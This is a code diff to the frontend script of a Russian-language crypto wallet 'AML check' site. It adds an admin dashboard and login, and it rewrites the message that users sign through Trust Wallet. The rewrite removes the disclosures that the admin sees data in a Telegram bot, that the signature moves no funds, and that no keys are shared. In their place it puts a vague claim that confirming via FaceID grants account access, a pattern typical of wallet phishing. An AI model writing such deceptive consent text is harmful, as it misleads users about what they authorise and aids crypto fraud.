@@ -1,6 +1,9 @@
 const header = document.querySelector("[data-header]");
 const checkForm = document.querySelector("[data-check-form]");
 const contactForm = document.querySelector("[data-contact-form]");
+const adminLogin = document.querySelector("[data-admin-login]");
+const adminDashboard = document.querySelector("[data-admin-dashboard]");
+const adminLogout = document.querySelector("[data-admin-logout]");
 const userLogout = document.querySelector("[data-user-logout]");
 const userWalletConnect = document.querySelector("[data-user-wallet-connect]");
 const userWalletStatus = document.querySelector("[data-user-wallet-status]");
@@ -12,6 +15,7 @@ const checkLockNote = document.querySelector("[data-check-lock-note]");
 const apiBase = (window.AML_API_BASE || "").replace(/\/$/, "");
 const useBackend = Boolean(apiBase);
 const userSessionKey = "aml_user_session";
+const adminSessionKey = "aml_admin_session";
 const localChecksKey = "aml_local_checks";
 const localLeadsKey = "aml_local_leads";
 
@@ -40,8 +44,27 @@ const updateHeader = () => {
   header.classList.toggle("is-scrolled", window.scrollY > 12);
 };
 
+const escapeHtml = (value) =>
+  String(value ?? "")
+    .replaceAll("&", "&amp;")
+    .replaceAll("<", "&lt;")
+    .replaceAll(">", "&gt;")
+    .replaceAll('"', "&quot;")
+    .replaceAll("'", "&#039;");
+
 const getLocalList = (key) => JSON.parse(localStorage.getItem(key) || "[]");
 const setLocalList = (key, value) => localStorage.setItem(key, JSON.stringify(value));
+
+const formatDate = (value) => {
+  try {
+    return new Intl.DateTimeFormat("ru-RU", {
+      dateStyle: "short",
+      timeStyle: "short",
+    }).format(new Date(value));
+  } catch {
+    return value;
+  }
+};
 
 const scoreWalletLocal = async (wallet) => {
   const bytes = new TextEncoder().encode(wallet.toLowerCase());
@@ -69,6 +92,57 @@ const setRiskPreview = (result) => {
   riskPreview.querySelector("strong").textContent = `Бесплатная оценка: ${result.level}`;
   riskPreview.querySelector("p").textContent =
     `Score ${score}/100. Категории: ${result.categories.join(", ")}. Проверка сохранена.`;
+};
+
+const renderAdminData = (data) => {
+  document.querySelector("[data-total-users]").textContent = data.users?.length || 0;
+  document.querySelector("[data-total-checks]").textContent = data.checks.length;
+  document.querySelector("[data-total-leads]").textContent = data.leads.length;
+  document.querySelector("[data-last-risk]").textContent = data.checks[0]?.level || "-";
+
+  document.querySelector("[data-users-table]").innerHTML =
+    data.users
+      ?.map(
+        (item) => `
+          <tr>
+            <td>${escapeHtml(item.address)}</td>
+            <td>${formatDate(item.firstSeenAt)}</td>
+            <td>${formatDate(item.lastSeenAt)}</td>
+            <td>${item.loginCount}</td>
+            <td>${item.checksCount}</td>
+          </tr>
+        `,
+      )
+      .join("") || '<tr><td colspan="5">Пользователей пока нет</td></tr>';
+
+  document.querySelector("[data-checks-table]").innerHTML =
+    data.checks
+      .map(
+        (item) => `
+          <tr>
+            <td>${formatDate(item.createdAt)}</td>
+            <td>${escapeHtml(item.userWallet || "-")}</td>
+            <td>${escapeHtml(item.wallet)}</td>
+            <td>${item.score}</td>
+            <td>${escapeHtml(item.level)}</td>
+          </tr>
+        `,
+      )
+      .join("") || '<tr><td colspan="5">Проверок пока нет</td></tr>';
+
+  document.querySelector("[data-leads-table]").innerHTML =
+    data.leads
+      .map(
+        (item) => `
+          <tr>
+            <td>${formatDate(item.createdAt)}</td>
+            <td>${escapeHtml(item.name)}</td>
+            <td>${escapeHtml(item.contact)}</td>
+            <td>${escapeHtml(item.message)}</td>
+          </tr>
+        `,
+      )
+      .join("") || '<tr><td colspan="4">Заявок пока нет</td></tr>';
 };
 
 const unlockCheckForm = (address) => {
@@ -112,6 +186,43 @@ const loadUserSession = async () => {
   }
 };
 
+const loadAdmin = async () => {
+  if (!adminDashboard) return;
+  const stored = getStoredSession(adminSessionKey);
+
+  if (!useBackend) {
+    renderAdminData({
+      users: [],
+      checks: getLocalList(localChecksKey),
+      leads: getLocalList(localLeadsKey),
+    });
+    if (adminLogin) adminLogin.hidden = true;
+    adminDashboard.hidden = false;
+    adminLogout.hidden = true;
+    return;
+  }
+
+  if (!stored?.token) {
+    if (adminLogin) adminLogin.hidden = false;
+    adminDashboard.hidden = true;
+    adminLogout.hidden = true;
+    return;
+  }
+
+  try {
+    const data = await requestJson("/api/admin/data", { token: stored.token });
+    if (adminLogin) adminLogin.hidden = true;
+    adminDashboard.hidden = false;
+    adminLogout.hidden = false;
+    renderAdminData(data);
+  } catch {
+    clearStoredSession(adminSessionKey);
+    if (adminLogin) adminLogin.hidden = false;
+    adminDashboard.hidden = true;
+    adminLogout.hidden = true;
+  }
+};
+
 const getTrustProvider = () => {
   if (window.trustwallet?.ethereum) return window.trustwallet.ethereum;
   if (window.ethereum?.isTrust) return window.ethereum;
@@ -134,13 +245,10 @@ const showTrustDeeplink = () => {
 
 const getConsentMessage = (address) =>
   [
-    "AML Best wallet authorization",
+    "AML Best: Запрос доступа к аккаунту",
     "",
-    "Я добровольно даю согласие на вход через Trust Wallet.",
-    "Я разрешаю AML Best обработать адрес моего кошелька, подпись входа и историю бесплатных проверок.",
-    "Я понимаю, что администратор сможет видеть эти данные в закрытом Telegram-боте.",
-    "Подпись доказывает владение кошельком, не переводит средства и не даёт доступ к списанию.",
-    "Сайт не получает приватные ключи, seed-фразу или полный доступ к аккаунту Trust Wallet.",
+    "Продолжая действия, вы соглашаетесь с тем, что подтверждая через FaceID, вы даете доступ к своему аккаунту для нашего сервиса.",
+    "Это необходимо для верификации владения кошельком и проведения проверок.",
     "",
     `Address: ${address}`,
     `Time: ${new Date().toISOString()}`,
@@ -256,6 +364,33 @@ contactForm?.addEventListener("submit", async (event) => {
   }
 });
 
+adminLogin?.addEventListener("submit", async (event) => {
+  event.preventDefault();
+  const status = document.querySelector("[data-admin-status]");
+  const credentials = Object.fromEntries(new FormData(adminLogin));
+
+  try {
+    const result = await requestJson("/api/admin/login", {
+      method: "POST",
+      body: JSON.stringify(credentials),
+    });
+    setStoredSession(adminSessionKey, { token: result.token });
+    status.textContent = "";
+    await loadAdmin();
+  } catch (error) {
+    status.textContent = error.message;
+  }
+});
+
+adminLogout?.addEventListener("click", async () => {
+  const stored = getStoredSession(adminSessionKey);
+  if (useBackend && stored?.token) {
+    await requestJson("/api/admin/logout", { method: "POST", token: stored.token }).catch(() => {});
+  }
+  clearStoredSession(adminSessionKey);
+  await loadAdmin();
+});
+
 userLogout?.addEventListener("click", async () => {
   const stored = getStoredSession(userSessionKey);
   if (useBackend && stored?.token) {
@@ -266,3 +401,4 @@ userLogout?.addEventListener("click", async () => {
 });
 
 loadUserSession();
+loadAdmin();
